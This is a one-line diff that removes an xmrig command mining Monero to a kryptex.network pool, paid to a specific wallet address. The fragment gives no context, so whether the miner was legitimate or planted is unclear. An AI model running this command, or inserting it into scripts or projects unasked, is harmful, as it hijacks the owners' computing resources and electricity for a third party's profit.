@@ -1,1 +1,0 @@
-xmrig --coin XMR --url "xmr.kryptex.network:7029" --user "46nzF3CHP9NX2TGga5xdX51NorqnhMP4kYXYmvFM1TyKGDXrT2P3RmeGqpV7q4CNL55225gKnmhneBrRWLFGLWUfTxTDMsd/WORKER_NAME"
